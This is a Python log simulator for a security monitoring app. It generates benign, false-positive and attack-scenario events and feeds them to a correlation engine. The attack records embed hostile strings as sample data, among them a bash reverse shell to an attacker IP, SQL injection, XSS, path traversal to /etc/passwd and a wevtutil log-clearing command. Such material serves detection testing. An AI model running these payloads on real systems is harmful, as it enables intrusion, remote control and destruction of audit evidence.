import asyncio
import random
import datetime
from sqlalchemy.orm import Session
from app.core.database import SessionLocal
from app.models.models import SecurityLog
from app.services.parser_service import resolve_geoip, parse_user_agent
from app.services.correlation_engine import correlate_log
from app.core.logging import logger

# --- Pools and Helpers ---
USER_POOL = ["john.doe", "alice.smith", "bob.johnson", "charlie.brown", "david.miller", "admin", "root", "db_admin"]
IP_POOL = [f"192.168.1.{i}" for i in range(10, 100)] + [f"10.0.0.{i}" for i in range(50, 150)]

def _generate_external_ips(count=150):
    ips = []
    r = random.Random(42)
    while len(ips) < count:
        first = r.randint(1, 223)
        if first in (10, 127, 169, 172, 192):
            continue
        ip = f"{first}.{r.randint(1, 254)}.{r.randint(1, 254)}.{r.randint(1, 254)}"
        if ip not in ips:
            ips.append(ip)
    return ips

EXTERNAL_IP_POOL = _generate_external_ips(150)
EXTERNAL_IP_BENIGN = EXTERNAL_IP_POOL[0:50]
EXTERNAL_IP_MEDIUM = EXTERNAL_IP_POOL[50:90]
EXTERNAL_IP_HIGH = EXTERNAL_IP_POOL[90:130]
EXTERNAL_IP_CRITICAL = EXTERNAL_IP_POOL[130:150]

_original_choice = random.choice
def custom_choice(seq):
    if seq is EXTERNAL_IP_POOL:
        import inspect
        frame = inspect.currentframe().f_back
        caller_name = frame.f_code.co_name
        if any(kw in caller_name for kw in ["wannacry", "ransomware", "reverse_shell", "c2", "exfiltration", "deletion", "kubernetes", "malware"]):
            return _original_choice(EXTERNAL_IP_CRITICAL)
        elif any(kw in caller_name for kw in ["sqli", "xss", "brute_force", "credential", "traversal", "ldap", "dns", "phishing", "tor"]):
            return _original_choice(EXTERNAL_IP_HIGH)
        else:
            return _original_choice(EXTERNAL_IP_MEDIUM)
    return _original_choice(seq)

# Safe choice wrapper that uses custom logic
def safe_choice(seq):
    return custom_choice(seq)

WEB_PATHS = ["/index.html", "/products/12", "/api/v1/search", "/login.php", "/contact", "/about", "/static/js/main.js"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
]

def get_utc_now():
    return datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None).isoformat() + "Z"

def parse_timestamp(ts_str):
    try:
        clean = ts_str.replace("Z", "")
        if "." in clean:
            return datetime.datetime.fromisoformat(clean)
        return datetime.datetime.strptime(clean, "%Y-%m-%dT%H:%M:%S")
    except Exception:
        return datetime.datetime.now()

# --- Benign Event Generators ---
def gen_benign_auth():
    user = safe_choice(USER_POOL)
    ip = safe_choice(EXTERNAL_IP_BENIGN) if random.random() < 0.3 else safe_choice(IP_POOL)
    return {
        "event_type": "auth",
        "severity": "INFO",
        "message": f"sshd[12942]: Accepted password for {user} from {ip} port {random.randint(49152, 65535)} ssh2",
        "raw_payload": f"{get_utc_now()} server sshd[12942]: Accepted password for {user} from {ip}",
        "source_ip": ip,
        "destination_ip": "10.0.0.5",
        "source_port": random.randint(49152, 65535),
        "destination_port": 22,
        "user_id": user,
        "user_agent": "SSH-2.0-OpenSSH_8.2p1",
        "timestamp": get_utc_now()
    }

def gen_benign_web():
    ip = safe_choice(EXTERNAL_IP_BENIGN) if random.random() < 0.3 else safe_choice(IP_POOL)
    path = safe_choice(WEB_PATHS)
    return {
        "event_type": "web",
        "severity": "INFO",
        "message": f"Web server access: GET {path} HTTP/1.1 from {ip}",
        "raw_payload": f"GET {path} HTTP/1.1\nHost: company.local\nUser-Agent: {safe_choice(USER_AGENTS)}\nIP: {ip}",
        "source_ip": ip,
        "destination_ip": "10.0.0.80",
        "source_port": random.randint(49152, 65535),
        "destination_port": 443,
        "user_id": safe_choice(USER_POOL),
        "user_agent": safe_choice(USER_AGENTS),
        "timestamp": get_utc_now()
    }

def gen_benign_system():
    return {
        "event_type": "system",
        "severity": "INFO",
        "message": f"System status update: disk space utilization at {random.randint(20, 65)}%",
        "raw_payload": f"systemd[1]: Started Periodic Command Scheduler.",
        "source_ip": "127.0.0.1",
        "destination_ip": "127.0.0.1",
        "user_agent": "System Agent",
        "timestamp": get_utc_now()
    }

def gen_benign_firewall():
    src_ip = safe_choice(EXTERNAL_IP_BENIGN) if random.random() < 0.3 else safe_choice(IP_POOL)
    dst_ip = f"8.8.8.{random.randint(1, 8)}"
    port = safe_choice([53, 80, 443])
    return {
        "event_type": "firewall",
        "severity": "INFO",
        "message": f"Firewall allowed outbound packet from {src_ip} to {dst_ip}:{port}",
        "raw_payload": f"rule=101 action=allow src={src_ip} dst={dst_ip} proto=tcp dport={port}",
        "source_ip": src_ip,
        "destination_ip": dst_ip,
        "source_port": random.randint(49152, 65535),
        "destination_port": port,
        "user_agent": "Firewall Agent",
        "timestamp": get_utc_now()
    }

# --- False Positive Event Generators ---
def gen_fp_sqli():
    ip = safe_choice(IP_POOL)
    search_queries = [
        "O'Connor's Irish Union",
        "select a color",
        "UNION trade union membership criteria",
        "order by number 1 or 2"
    ]
    query = safe_choice(search_queries)
    return {
        "event_type": "web",
        "severity": "INFO",
        "message": f"Search input received: {query}",
        "raw_payload": f"GET /search?q={query} HTTP/1.1\nHost: company.local\nUser-Agent: {safe_choice(USER_AGENTS)}\nIP: {ip}",
        "source_ip": ip,
        "destination_ip": "10.0.0.80",
        "source_port": random.randint(49152, 65535),
        "destination_port": 443,
        "user_id": safe_choice(USER_POOL),
        "user_agent": safe_choice(USER_AGENTS),
        "timestamp": get_utc_now()
    }

def gen_fp_xss():
    ip = safe_choice(IP_POOL)
    code_snippets = [
        "In JavaScript, write <script>console.log('hello')</script> to test.",
        "To load an image with error fallback, use: <img src=x onerror=handleError()>"
    ]
    post_body = safe_choice(code_snippets)
    return {
        "event_type": "web",
        "severity": "INFO",
        "message": f"Forum post submitted: {post_body}",
        "raw_payload": f"POST /api/v1/posts HTTP/1.1\nHost: company.local\nContent-Type: application/json\nIP: {ip}\n\n{{\"body\": \"{post_body}\"}}",
        "source_ip": ip,
        "destination_ip": "10.0.0.80",
        "source_port": random.randint(49152, 65535),
        "destination_port": 443,
        "user_id": safe_choice(USER_POOL),
        "user_agent": safe_choice(USER_AGENTS),
        "timestamp": get_utc_now()
    }

def gen_fp_scan():
    ip = "10.0.0.10"
    return {
        "event_type": "system",
        "severity": "INFO",
        "message": f"Network health check: pinging domain controller 10.0.0.2 successful",
        "raw_payload": f"mon-service: ping latency to 10.0.0.2 is 2ms",
        "source_ip": ip,
        "destination_ip": "10.0.0.2",
        "user_agent": "Internal Monitor Agent",
        "timestamp": get_utc_now()
    }

# --- True Positive Attack Scenario Sequence Generators ---
def gen_tp_brute_force():
    attacker_ip = safe_choice(EXTERNAL_IP_POOL)
    target_user = "admin"
    logs = []
    base_time = datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None) - datetime.timedelta(seconds=5)
    for i in range(5):
        ts = (base_time + datetime.timedelta(seconds=i)).isoformat() + "Z"
        logs.append({
            "event_type": "auth",
            "severity": "WARNING",
            "message": f"sshd[28451]: Failed password for invalid user {target_user} from {attacker_ip} port {50000+i} ssh2",
            "raw_payload": f"{ts} server sshd[28451]: Failed password for invalid user {target_user} from {attacker_ip}",
            "source_ip": attacker_ip,
            "destination_ip": "10.0.0.15",
            "source_port": 50000 + i,
            "destination_port": 22,
            "user_id": target_user,
            "user_agent": "SSH-2.0-OpenSSH_8.2p1",
            "timestamp": ts
        })
    return logs

def gen_tp_credential_stuffing():
    attacker_ip = safe_choice(EXTERNAL_IP_POOL)
    users = ["john", "sarah", "michael", "jessica", "david"]
    logs = []
    base_time = datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None) - datetime.timedelta(seconds=5)
    for i, user in enumerate(users):
        ts = (base_time + datetime.timedelta(seconds=i)).isoformat() + "Z"
        logs.append({
            "event_type": "auth",
            "severity": "WARNING",
            "message": f"sshd[31405]: Failed password for {user} from {attacker_ip} port 51102 ssh2",
            "raw_payload": f"{ts} server sshd[31405]: Failed password for {user} from {attacker_ip}",
            "source_ip": attacker_ip,
            "destination_ip": "10.0.0.15",
            "source_port": 51102,
            "destination_port": 22,
            "user_id": user,
            "user_agent": "SSH-2.0-Go",
            "timestamp": ts
        })
    return logs

def gen_tp_distributed_brute_force():
    target_user = "root"
    ips = ["198.51.100.10", "203.0.113.25", "185.190.140.40", "95.142.100.12", "82.102.23.9"]
    logs = []
    base_time = datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None) - datetime.timedelta(seconds=5)
    for i, ip in enumerate(ips):
        ts = (base_time + datetime.timedelta(seconds=i)).isoformat() + "Z"
        logs.append({
            "event_type": "auth",
            "severity": "WARNING",
            "message": f"sshd[31200]: Failed password for {target_user} from {ip} port 38290 ssh2",
            "raw_payload": f"{ts} server sshd[31200]: Failed password for {target_user} from {ip}",
            "source_ip": ip,
            "destination_ip": "10.0.0.15",
            "source_port": 38290,
            "destination_port": 22,
            "user_id": target_user,
            "user_agent": "SSH-2.0-OpenSSH_8.0",
            "timestamp": ts
        })
    return logs

def gen_tp_sqli():
    attacker_ip = safe_choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "web",
        "severity": "ERROR",
        "message": f"WAF: SQL Injection detected on login page payload: ' OR '1'='1",
        "raw_payload": f"GET /login.php?user=admin' OR '1'='1&pass=test HTTP/1.1\nHost: securebank.com\nUser-Agent: sqlmap/1.4\nIP: {attacker_ip}",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.80",
        "source_port": 52143,
        "destination_port": 443,
        "user_id": "guest",
        "user_agent": "sqlmap/1.4.12#stable",
        "timestamp": get_utc_now()
    }]

def gen_tp_xss():
    attacker_ip = safe_choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "web",
        "severity": "ERROR",
        "message": f"WAF: Cross-Site Scripting (XSS) payload: <script>alert(document.cookie)</script>",
        "raw_payload": f"POST /api/v1/comments HTTP/1.1\nHost: company.local\nIP: {attacker_ip}\nUser-Agent: Mozilla/5.0\n\n{{\"comment\": \"<script>alert(1)</script>\"}}",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.80",
        "source_port": 53210,
        "destination_port": 443,
        "user_id": "guest",
        "user_agent": "Mozilla/5.0",
        "timestamp": get_utc_now()
    }]

def gen_tp_port_scan():
    attacker_ip = safe_choice(EXTERNAL_IP_POOL)
    ports = [21, 22, 23, 25, 80, 110, 443, 8080]
    logs = []
    base_time = datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None) - datetime.timedelta(seconds=4)
    for i, port in enumerate(ports):
        ts = (base_time + datetime.timedelta(seconds=i * 0.5)).isoformat() + "Z"
        logs.append({
            "event_type": "firewall",
            "severity": "INFO",
            "message": f"Firewall blocked nmap scanning attempt from {attacker_ip} to port {port}",
            "raw_payload": f"rule=104 action=block src={attacker_ip} dst=10.0.0.5 proto=tcp sport=54321 dport={port}",
            "source_ip": attacker_ip,
            "destination_ip": "10.0.0.5",
            "source_port": 54321,
            "destination_port": port,
            "user_agent": "Nmap Scripting Engine",
            "timestamp": ts
        })
    return logs

def gen_tp_malware():
    attacker_ip = safe_choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "system",
        "severity": "CRITICAL",
        "message": f"Antivirus Alert: Trojan backdoor activity detected on host 10.0.0.15. Signature: Trojan.Win32.ReverseShell.a",
        "raw_payload": f"Antivirus engine flagged local file execution: C:\\Users\\Public\\shell.exe running under system context, establishing external connection to command-and-control server at {attacker_ip}.",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.15",
        "source_port": 4444,
        "destination_port": 443,
        "user_id": "system",
        "user_agent": "Antivirus Agent v4.1",
        "timestamp": get_utc_now()
    }]

def gen_tp_policy_violation():
    return [{
        "event_type": "auth",
        "severity": "WARNING",
        "message": f"Security Policy Violation: Unauthorized administrative privilege escalation attempt by user john.doe.",
        "raw_payload": f"User john.doe executed 'sudo su -' without authorization. Action logged as security policy bypass in system audit configuration.",
        "source_ip": "10.0.0.102",
        "destination_ip": "10.0.0.15",
        "source_port": 58210,
        "destination_port": 22,
        "user_id": "john.doe",
        "user_agent": "Bash / Sudo Audit",
        "timestamp": get_utc_now()
    }]

def gen_tp_directory_traversal():
    attacker_ip = safe_choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "web",
        "severity": "ERROR",
        "message": f"WAF: Directory Traversal attack attempt from {attacker_ip} searching /etc/passwd",
        "raw_payload": f"GET /../../../../etc/passwd HTTP/1.1\nHost: company.local\nIP: {attacker_ip}\nUser-Agent: Nikto/2.1",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.80",
        "source_port": 49201,
        "destination_port": 443,
        "user_id": "guest",
        "user_agent": "Nikto/2.1.5",
        "timestamp": get_utc_now()
    }]

def gen_tp_root_ssh_login():
    attacker_ip = safe_choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "auth",
        "severity": "WARNING",
        "message": f"sshd[31201]: Failed password for invalid user root from {attacker_ip} port 49100 ssh2",
        "raw_payload": f"sshd[31201]: Failed password for invalid user root from {attacker_ip}",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.2",
        "source_port": 49100,
        "destination_port": 22,
        "user_id": "root",
        "user_agent": "SSH-2.0-OpenSSH_8.0",
        "timestamp": get_utc_now()
    }]

def gen_tp_ransomware_staged():
    attacker_ip = safe_choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "system",
        "severity": "CRITICAL",
        "message": f"Antivirus Alert: Staging of ransomware file payload cryptolocker.encrypt detected on 10.0.0.15.",
        "raw_payload": f"System AV detected staged execution: C:\\Users\\Public\\cryptolocker.encrypt. Ransomware signature match.",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.15",
        "source_port": 4444,
        "destination_port": 443,
        "user_id": "administrator",
        "user_agent": "Antivirus Agent v4.1",
        "timestamp": get_utc_now()
    }]

def gen_tp_ldap_injection():
    attacker_ip = safe_choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "web",
        "severity": "ERROR",
        "message": f"WAF: LDAP Injection query detected in web form input: *(objectClass=*) from {attacker_ip}",
        "raw_payload": f"POST /api/v1/users HTTP/1.1\nHost: company.local\nPayload: user=*(objectClass=*)\nIP: {attacker_ip}",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.80",
        "source_port": 50110,
        "destination_port": 443,
        "user_id": "guest",
        "user_agent": "Mozilla/5.0",
        "timestamp": get_utc_now()
    }]

def gen_tp_dns_tunneling():
    return [{
        "event_type": "firewall",
        "severity": "WARNING",
        "message": "Firewall Alert: DNS Tunneling exfiltration signature match: high frequency query rate detected on 10.0.0.50.",
        "raw_payload": "rule=110 action=alert src=10.0.0.50 dst=8.8.8.8 query=exfil.v1.domain.com. policy violation",
        "source_ip": "10.0.0.50",
        "destination_ip": "8.8.8.8",
        "source_port": 59300,
        "destination_port": 53,
        "user_id": "system",
        "user_agent": "Firewall Agent",
        "timestamp": get_utc_now()
    }]

def gen_tp_phishing_download():
    return [{
        "event_type": "web",
        "severity": "ERROR",
        "message": "Gateway Proxy: Phishing payload trojan downloader matched: security-update-verification.com/payload.exe",
        "raw_payload": "GET /payload.exe HTTP/1.1\nHost: security-update-verification.com\nIP: 10.0.0.60\nMalware Signature Detected",
        "source_ip": "10.0.0.60",
        "destination_ip": "198.51.100.5",
        "source_port": 52140,
        "destination_port": 80,
        "user_id": "alice.smith",
        "user_agent": "Mozilla/5.0",
        "timestamp": get_utc_now()
    }]

def gen_tp_tor_exit_node():
    return [{
        "event_type": "firewall",
        "severity": "WARNING",
        "message": "Firewall Action Block: Traffic detected from known Tor exit node IP 185.220.101.5 to internal proxy gateway.",
        "raw_payload": "rule=120 action=block src=185.220.101.5 dst=10.0.0.100 policy violation tor exit route",
        "source_ip": "185.220.101.5",
        "destination_ip": "10.0.0.100",
        "source_port": 55102,
        "destination_port": 443,
        "user_id": "system",
        "user_agent": "Tor Ingress Monitor",
        "timestamp": get_utc_now()
    }]

def gen_tp_unauthorized_api():
    attacker_ip = safe_choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "web",
        "severity": "WARNING",
        "message": f"Web Gateway: 403 Forbidden unauthorized admin API key access attempt on /api/v1/admin from {attacker_ip}",
        "raw_payload": f"GET /api/v1/admin HTTP/1.1\nAuthorization: Bearer invalidKey\nIP: {attacker_ip}\nResult: Unauthorized Access",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.80",
        "source_port": 54100,
        "destination_port": 443,
        "user_id": "guest",
        "user_agent": "curl/7.81.0",
        "timestamp": get_utc_now()
    }]

def gen_tp_ddos_syn():
    attacker_ip = safe_choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "firewall",
        "severity": "WARNING",
        "message": f"IDS Alert: DDoS SYN Flood attack signature matched from {attacker_ip}. Traffic threshold exceeded on Port 80.",
        "raw_payload": f"firewall_sensor: action=alert src={attacker_ip} dst=10.0.0.5 proto=tcp flags=SYN count=1200",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.5",
        "source_port": 64320,
        "destination_port": 80,
        "user_id": "system",
        "user_agent": "IDS Sensor 01",
        "timestamp": get_utc_now()
    }]

def gen_tp_registry_tampering():
    return [{
        "event_type": "system",
        "severity": "CRITICAL",
        "message": "Sysmon Alert: Windows Registry tampering detected: Trojan persistent backdoor injected in Run registry key.",
        "raw_payload": "Registry Key Added: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor path: C:\\temp\\shell.exe",
        "source_ip": "10.0.0.2",
        "destination_ip": "10.0.0.2",
        "source_port": 0,
        "destination_port": 0,
        "user_id": "system",
        "user_agent": "Sysmon Agent 14.1",
        "timestamp": get_utc_now()
    }]

def gen_tp_sensitive_file_access():
    return [{
        "event_type": "system",
        "severity": "CRITICAL",
        "message": "OS Audit: Sensitive system file accessed: unauthorized read on /etc/shadow by user bob.johnson.",
        "raw_payload": "auditd: event=READ path=/etc/shadow user=bob.johnson result=success policy violation",
        "source_ip": "10.0.0.15",
        "destination_ip": "10.0.0.15",
        "source_port": 0,
        "destination_port": 0,
        "user_id": "bob.johnson",
        "user_agent": "Linux Auditd",
        "timestamp": get_utc_now()
    }]

def gen_tp_kubernetes_priv_bypass():
    return [{
        "event_type": "system",
        "severity": "HIGH",
        "message": "Kubernetes Audit: ClusterRoleBinding created by system:anonymous. Potential privilege escalation bypass.",
        "raw_payload": "Kube-API: POST /apis/rbac.authorization.k8s.io/v1/clusterrolebindings user=system:anonymous status=201",
        "source_ip": "10.0.0.100",
        "destination_ip": "10.0.0.100",
        "source_port": 6443,
        "destination_port": 6443,
        "user_id": "system:anonymous",
        "user_agent": "Kubelet Client",
        "timestamp": get_utc_now()
    }]

def gen_tp_log_deletion():
    return [{
        "event_type": "system",
        "severity": "CRITICAL",
        "message": "OS Audit: System event log deletion attempt: event log cleared using wevtutil command by admin.",
        "raw_payload": "wevtutil.exe cl Security policy violation log cleared command executed by admin.",
        "source_ip": "10.0.0.2",
        "destination_ip": "10.0.0.2",
        "source_port": 0,
        "destination_port": 0,
        "user_id": "admin",
        "user_agent": "Powershell Host",
        "timestamp": get_utc_now()
    }]

def gen_tp_c2_contact():
    attacker_ip = safe_choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "firewall",
        "severity": "CRITICAL",
        "message": f"IDS Alert: Command & Control (C2) contact matched: periodic outbound beaconing to malicious IP {attacker_ip}.",
        "raw_payload": f"ids_sensor: action=alert src=10.0.0.15 dst={attacker_ip} proto=tcp dport=4444 signature=cnc contact",
        "source_ip": "10.0.0.15",
        "destination_ip": attacker_ip,
        "source_port": 49102,
        "destination_port": 4444,
        "user_id": "system",
        "user_agent": "IDS Engine 2.0",
        "timestamp": get_utc_now()
    }]

def gen_tp_reverse_shell():
    attacker_ip = safe_choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "system",
        "severity": "CRITICAL",
        "message": f"Sysmon Alert: Reverse shell connection spawned: active bash terminal pointing to external IP {attacker_ip}.",
        "raw_payload": f"Process Created: /bin/bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1 run under user root",
        "source_ip": "10.0.0.15",
        "destination_ip": attacker_ip,
        "source_port": 49120,
        "destination_port": 4444,
        "user_id": "root",
        "user_agent": "Sysmon Linux",
        "timestamp": get_utc_now()
    }]

def gen_tp_suspicious_rdp():
    attacker_ip = safe_choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "auth",
        "severity": "HIGH",
        "message": f"Windows Security: Suspicious RDP Session established outside business hours from {attacker_ip} by root.",
        "raw_payload": f"EventID 4624 LogonType 10 RDP connection allowed from {attacker_ip} to 10.0.0.2 unauthorized access",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.2",
        "source_port": 50123,
        "destination_port": 3389,
        "user_id": "root",
        "user_agent": "RDP Client",
        "timestamp": get_utc_now()
    }]

def gen_tp_data_exfiltration_ftp():
    attacker_ip = safe_choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "firewall",
        "severity": "HIGH",
        "message": f"IDS Alert: Potential data exfiltration via FTP: huge outbound payload (1.2GB) transferred to {attacker_ip}.",
        "raw_payload": f"firewall_rule: action=allow src=10.0.0.15 dst={attacker_ip} bytes_sent=1280000000 dport=21 policy violation",
        "source_ip": "10.0.0.15",
        "destination_ip": attacker_ip,
        "source_port": 50400,
        "destination_port": 21,
        "user_id": "db_admin",
        "user_agent": "FTP Client",
        "timestamp": get_utc_now()
    }]

def gen_tp_wannacry_prop():
    attacker_ip = safe_choice(EXTERNAL_IP_POOL)
    return [{
        "event_type": "system",
        "severity": "CRITICAL",
        "message": f"Antivirus Alert: WannaCry ransomware propagation matched: scanning internal SMB Port 445 on 10.0.0.15.",
        "raw_payload": f"AV Match: malware WannaCry Ransomware signature block activity on host 10.0.0.15.",
        "source_ip": attacker_ip,
        "destination_ip": "10.0.0.15",
        "source_port": 61200,
        "destination_port": 445,
        "user_id": "system",
        "user_agent": "Antivirus Agent v4.1",
        "timestamp": get_utc_now()
    }]

_keep_running = True

async def run_simulator_loop(interval: float = 2.0, attack_ratio: float = 0.20):
    global _keep_running
    logger.info("Initializing hosted log simulator background service...")
    
    await asyncio.sleep(5)  # Delay start to allow main database initialization to complete
    
    while _keep_running:
        try:
            db = SessionLocal()
            try:
                # Decides if this iteration generates an attack sequence or benign logs
                roll_attack = random.random()
                logs_data = []
                if roll_attack < attack_ratio:
                    attack_gen = random.choice([
                        gen_tp_brute_force, gen_tp_credential_stuffing, gen_tp_distributed_brute_force,
                        gen_tp_sqli, gen_tp_xss, gen_tp_port_scan, gen_tp_malware, gen_tp_policy_violation,
                        gen_tp_directory_traversal, gen_tp_root_ssh_login, gen_tp_ransomware_staged,
                        gen_tp_ldap_injection, gen_tp_dns_tunneling, gen_tp_phishing_download,
                        gen_tp_tor_exit_node, gen_tp_unauthorized_api, gen_tp_ddos_syn,
                        gen_tp_registry_tampering, gen_tp_sensitive_file_access, gen_tp_kubernetes_priv_bypass,
                        gen_tp_log_deletion, gen_tp_c2_contact, gen_tp_reverse_shell, gen_tp_suspicious_rdp,
                        gen_tp_data_exfiltration_ftp, gen_tp_wannacry_prop
                    ])
                    logs_data = attack_gen()
                else:
                    roll_fp = random.random()
                    if roll_fp < 0.15:
                        fp_gen = random.choice([gen_fp_sqli, gen_fp_xss, gen_fp_scan])
                        logs_data = [fp_gen()]
                    else:
                        benign_gen = random.choice([gen_benign_auth, gen_benign_web, gen_benign_system, gen_benign_firewall])
                        logs_data = [benign_gen()]

                for log_data in logs_data:
                    geo = log_data.get("geo_country") or resolve_geoip(log_data.get("source_ip"))
                    ua = parse_user_agent(log_data.get("user_agent")) if log_data.get("user_agent") else "System Agent"
                    
                    db_log = SecurityLog(
                        event_type=log_data.get("event_type"),
                        severity=log_data.get("severity"),
                        message=log_data.get("message"),
                        raw_payload=log_data.get("raw_payload"),
                        source_ip=log_data.get("source_ip"),
                        destination_ip=log_data.get("destination_ip"),
                        source_port=log_data.get("source_port"),
                        destination_port=log_data.get("destination_port"),
                        geo_country=geo,
                        user_agent=ua,
                        user_id=log_data.get("user_id"),
                        timestamp=parse_timestamp(log_data.get("timestamp"))
                    )
                    db.add(db_log)
                    db.commit()
                    db.refresh(db_log)
                    
                    # Run correlation engine on the newly persisted log
                    correlate_log(db_log, db)
                    
            except Exception as e:
                db.rollback()
                logger.error(f"Error in simulator iteration: {e}")
            finally:
                db.close()
                
        except Exception as outer_e:
            logger.error(f"Error running database session in simulator: {outer_e}")
            
        # Add random jitter to simulate natural pacing
        sleep_time = max(0.5, interval + random.uniform(-0.5, 0.5))
        await asyncio.sleep(sleep_time)

def stop_simulator():
    global _keep_running
    _keep_running = False
    logger.info("Hosted log simulator background service stopped.")
